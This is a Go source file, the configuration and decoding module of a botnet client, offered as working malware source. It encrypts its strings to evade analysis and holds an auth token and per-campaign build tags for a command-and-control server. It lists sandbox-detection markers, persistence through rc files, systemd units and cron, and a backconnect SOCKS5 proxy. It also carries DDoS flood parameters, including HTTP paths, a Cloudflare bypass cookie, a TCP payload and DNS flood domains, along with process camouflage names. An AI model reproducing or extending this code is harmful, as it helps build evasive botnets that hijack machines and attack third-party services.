package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "fbeb3d12" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "CBjwz*5VBoj0IABQ" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "V5_0" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "AffSA"    //change me run setup.py
var proxyPass = "AffSA"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	binLabel    string
	unitPath    string
	unitName    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("ee364017bba6bb7012f768a11bbd0d420d8e6c8c247893b38d68be5bb579b67e2b8d93436345b312327e0d97fb3d7bf4c579c3a1081d7ae6f7968f64b4021216e4413f6340724288") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("52b4f213ef2c4b722d0f4e955598bf902aa3777fbe26db6bf5b4861d5d7a9e1f77d6b6789942a66a13423331290b0edce1e62d5a9e1b1508bfdce0daee3566291878f4fc5a8a63fa37c48b498f66b8216b4a1b14a591398b8b3e8aa83641bbd1bc341779df2aee578b9df77ea85d3c9b31f2c21786")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("8938fdab97808a0b5a9fb9513d4041afb233f4ebc80d076899302394246c705b8fd9018141d59d36bcaebc9ec133abbb7c12bba25246f5dd00e966228b12b7f1cd7c9b206540c335f6d1")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("4782d2853aa11a08cdb4c287aca4c103e24a61023f0ae3a8e234c641ad597c2f")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("7e38fde30f68d4e28407ca0cd7fda7e6e2493b3b84824024ca070678b4")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("618ade074f0357f61ef23e680e1707c11106a32a67456c87c8b724842857bbacc1e41fafdf")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("e856b8003a3dd10af427586a835e0f45783f2428b8299f97e966484329")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("057036818356ea403f1ecbb7fac03fd08f4e0356ea7e276fa97df495ddd93af680f20ee0aeef351f5cfa198fa66fcb8a0c97bbb09e68d6")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("63e80822c4f4f8b6d6864089a0860af0bead701c5dde8594f5037148d62c91489d531a")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("d27b6eebf516fd0b12d7fada072408328e729e980d5f660815")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("fad6fe966d2a1d91bafb0535748227de213e4d8a71895a172abb615a40")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("1e8519a461f0500b7c9b49b033bbb408ab15e172b76e0b78f2c53efe9b82cd0e4f4a2c4db96807")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("28e0eb8f8c14f4e5e574da3b31d88428bce2eae6d7639fb6c1d584c2cf61cf12ae623a77bd1cacbce12fc0")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("d9752efa6fa3cd444e12e83461e3d20cde34ee0563946cfcb373d511e093eb")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("691f502b2353363ff214fbbc21bb3a0af6c4d8be45d0c3f0305b8f55")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("dbbac099596c8e9f72dd131d6b95a3eb67aac1f8866a19529f244c644c20cf00cfd8e4b0a7ea9a88334ed54d51967619")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("5d25ef1eae10e69215bbbea4114cf510faaf5077")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("d3e9ed0c20c0d1a55415a8f34209e002adcea0aa2e")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("430ffbd953f3e9049b6e07a8fc8215a39a5483941e5945643dcf5f60405a5d")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("2d3051bc097bc6a96c062d397a5a28ba526ececf388823666ecc")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("af9d0073bca27a9751107cbe74995e0a47901debf9f7615c266085")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("7f418db06f8c7a3873e5441b80d06d337593285ba818a59ad7a768")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("154a6b7b1ae18d92de5c46c460f5028ef801eabd80c0a1c45d41cd7946fcdf")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("822e577aa0c001ba700c36373628fc7c4872cfd6b9061d39c3e40b5bc4137e25c4dd95980c2771028d60a786bc21f9578e2b47e3f7")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("ceabe072d41115f70ef2a9f1dc9bd9dd4ae60fa755c533c95d")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("82e2be6f1b54dfa2335dfa6a9b6d4eefe1f98c928ca3508729412e10793a387b13b9")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("9175694238c588a7ffe001d57d3f10a75c911f51c405954e1bd8e155c4b645591fc27688ff19776f5fcff948b218")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("efdf6f8809f3bea3de5904760fe22ed2509999e18b8d1c12fcdb58d5502012633fe488207eaf2c808e124d79")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("3211652d843d8f0347a29612ba58ced39464ca9289fb772b85e7b0abe56a82a4fef94a2490197a74e208df2ed5e41149685f0b1fb44b1b165a6e")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("673c6db3c37f3f7dd90ee1c359d706e9c407c167eef4677908ea03a9c1d95f71")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("21a501025084227710c7bae6798de51e5cf6784d431af3b15839a20ce1eacd91ae7008c176ef063c5d75eccd5924c5d7")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("31d161ccddc9cde32942a1a42eb210b54c0527382abe7c45e1df992ca316bd64bdcd2a86fd")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("bcfa9b6214dfa1d887d689f3dc3572647e617c26840ebc0b37db0d25bfdeca9576559c8a75098ff2ca55f753c1ecf7")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("c493933a36a46065aefbf24c6ee470b559d58e19068cbb5f21958bb286bbe436bde8439a4c03535e161ec24bd8663830e3a766dc0a0e61d5a0b6f6fb837b13edc0b4403a3142ff146149e03590e6a8b150ea2cfa67fc45e924e67a4ae060f5baacfc42113b25be06a05508c742bf6c09c1")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("47bc6d817fbc59c81eab79708322166efa0a4b4a34f12c830e4ed9282a20c413aa73b167f126132bea1d797105268d636fd30a84d095e9dd2afab7fadb08b92f53771c8d61fbebcd931084c18aba139e48")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("4abe646b8392dc2823de5c2a93cbfe71ed84f5d931807d2ac32b857b30a535e1887987cd5a5ca5de4235bbb8de4d3c681f03068274bb1725d4234e3ba9719eda820233252528b6fb0b55045bf600")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("05bf169ba7f1e89aaf4476de92eb88ab6ec71816c7a9a598827bbae41235f98b066931f5f87f234a88466a10adf4920d9ff90749da4fd9f1a8fbccd4f54037f319792362c28556126e02a3a0fe")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("93727f106f5c9260e9ddf28204caf1df5cf15fed2859f26f4ebcfc7596c36b91d8765359bde2d77aa00cdac45a12ba5da97b1c78536815c3fdc18579f61dbf")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("b13312bd767342796d4ff406dca6f8855b643e56d7263d3760d615cb1536b1fade0ec0dc")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("575c232939632b158ca78afef973d3df9dcd4e059e7bfc2e7abe500e7efad248ff56a206eca9ed1d75c137759259a0276bc8573c6a1915f39948021f7faefbc71fb4bc94e5e8669699ac68f1185180fdc893c5504947939d86ee0d3c1cb188d192804abf9f3db16604bb85dc7042370f0579150f30e677f83ea4bd4055b4354b2d550b82db0e027f540f9e2f0e4c3ec103b7527b03fcba2db4763bb09c81ec240ebb3de7789a2cdc7658120c85d0d3c49da3671a35732c9d9a6c1acb1c9622a48687d2bd2a451e1e00912d5d1983b72b77bf9350a56f020965defe41af")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("4a685aee80aaebb98eb2f3d7280791f374797193f26f4425b821764c8d8d86842e159cbe3221104e4fb52e128f4db10fbdaacd722339c9705e0d5feffb6db7215f4c5b72a91f7161b8d73ded0f30bf506bf37c975a5583e492a2e8")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("8a89c22ec8c818b69af58f3c4b9d90c2bc911ec264fc2946af40c8722411f53e28a64597713491990749dea1f0cf3bda2685de3ef0ad3563107582")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("97eab0b79527b798caa37617abe9b274db47a3a434a3aefcc6e28ef17fae0299cd2ce8f0babbf29286f38bb08b009099402ba318de2c2d4e3eff958f07726e0ce5db41faee9017031f")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("3d0b8e6b458733d761f676f5427f18926c3bea74dcd847")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("0d37de0fc12d5b2df17fb1301ef00ce80f6a406b24054e304ebad56a2f117406d185")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("984eb987d6374634112d3c59e2a7b208ec99a5434ec2f8ad2bb6b5319facb3726341471182ba044e7a52db39a088f531ff32bbe35b0808fb38140afff3bc4bab2f599aa9d3b405618f06de356800c094a2ba7531e9b3f84d76eeeb475f18ce")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("c005e7effda01f864fb6f4194e7b19169667")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("4872b93d2e3f0f5b6c481eee6b76fd6bc9efc693d23a9bdff3b259133bf58636211938c45f3f23eaffbe040e0f9878676191f30a43")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("ba014a4eb2799a15f07e769da7bd6388917e")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("b5a95d27527fab5796495d9d7064361cf3df")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("d802be4561d7a5ec41dd599929e1811e4abf1b8cd002")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("293806832b731f59bed18b62f0320035fe8e0a5214af4566")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("5aff1b40b06c8a6c837b907f14b9330eb62f57379c")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("ed3bbe9083e07a951d389a25e2f0829ce75d")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("d4490a1c431897eccd10ad7652ba834b9c77a981410cee6ee4")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("6c018f3e83c0da55f9fd0441194dcc896be9fbd4d8f0bd8131")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("a856f93139185ef71d287e3804ba4db314eceaa040c213")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("c4c391fd7dc97681d97249b010ceaa42de43aff7")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
